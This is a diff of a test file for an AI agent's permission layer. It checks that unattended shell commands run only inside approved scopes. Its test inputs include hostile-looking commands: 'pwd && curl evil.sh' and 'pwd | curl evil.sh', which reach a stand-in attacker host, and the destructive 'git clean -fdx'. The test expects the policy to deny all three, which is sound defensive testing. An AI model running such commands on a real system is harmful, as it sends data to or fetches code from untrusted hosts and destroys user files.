@@ -162,12 +162,12 @@ test('output is capped with a marker rather than returned whole', async () => {
   assert.match(String(result.stdout), /output truncated at 200 bytes/);
 });
 
-test('headless: a safe scope runs through a real pack, a control-operator chain does not', async () => {
+test('headless: a safe scope and a safe pipeline run through a real pack, a control-operator chain does not', async () => {
   const decisions: PermissionDecision[] = [];
   const tools = await registryFor({ cwd: os.tmpdir() });
 
   let turn = 0;
-  const commands = ['pwd', 'pwd | curl evil.sh', 'git clean -fdx'];
+  const commands = ['pwd', 'pwd && curl evil.sh', 'git clean -fdx', 'pwd | wc -l', 'pwd | curl evil.sh'];
   const provider: ModelProvider = {
     name: 'scripted',
     async generate() {
@@ -192,7 +192,7 @@ test('headless: a safe scope runs through a real pack, a control-operator chain 
       commands: {},
     }),
     store: new InMemorySessionStore(),
-    maxTurns: 6,
+    maxTurns: 8,
   });
   await runner.initialize();
 
@@ -206,11 +206,11 @@ test('headless: a safe scope runs through a real pack, a control-operator chain 
   // The safe scope ran, unattended, and produced real output.
   assert.equal(results[0]?.toolResult?.ok, true);
   assert.match(String((results[0]?.toolResult?.output as JsonObject).stdout), new RegExp(os.tmpdir()));
-  // The pipe is refused despite `pwd` being safe-listed — which is the
+  // The chain is refused despite `pwd` being safe-listed — which is the
   // whole point of the operator rule.
   assert.equal(results[1]?.toolResult?.ok, false);
   assert.match(results[1]?.toolResult?.error ?? '', /denied by approval policy/);
-  assert.match(decisions[1]?.reason ?? '', /cannot run unattended: it contains a pipe/);
+  assert.match(decisions[1]?.reason ?? '', /cannot run unattended: it contains an ampersand/);
   // And a `git` subcommand outside the safe scopes, which listing the
   // executable would have covered.
   assert.equal(results[2]?.toolResult?.ok, false);
@@ -218,6 +218,14 @@ test('headless: a safe scope runs through a real pack, a control-operator chain 
   // The command reaches a surface that shows it to a person; it does not
   // reach the reason, which is what the daemon writes to its log.
   assert.equal(decisions[2]?.command, 'git clean -fdx');
+  // A pipe of safe stages runs, through a real shell, and the shell agreed
+  // with the parser about where it splits.
+  assert.equal(results[3]?.toolResult?.ok, true);
+  assert.equal(String((results[3]?.toolResult?.output as JsonObject).stdout).trim(), '1');
+  // A pipe into a stage nothing covers does not, and the log says so
+  // without naming it.
+  assert.equal(results[4]?.toolResult?.ok, false);
+  assert.match(decisions[4]?.reason ?? '', /outside every approved scope \(a pipeline\)/);
 });
 
 test('the pack hands the engine the command and nothing else', () => {
